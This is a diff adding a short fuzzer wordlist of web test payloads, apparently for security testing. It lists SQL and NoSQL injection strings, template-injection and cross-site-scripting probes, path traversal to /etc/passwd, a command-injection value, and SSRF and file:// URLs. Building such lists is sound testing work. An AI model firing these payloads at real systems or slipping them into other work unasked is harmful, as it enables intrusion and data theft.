@@ -1,0 +1,16 @@
+# webbreach fuzzer wordlist (test payloads)
+' OR 1=1--
+admin'--
+{{7*7}}
+{{7+7}}
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+../../../etc/passwd
+../../tmp/lab_secret.txt
+; echo WBFUZZ_test
+0; DROP TABLE users--
+["admin"]
+{"$where":"1==1"}
+1 UNION SELECT 1,2--
+http://127.0.0.2:9/
+file:///etc/hostname
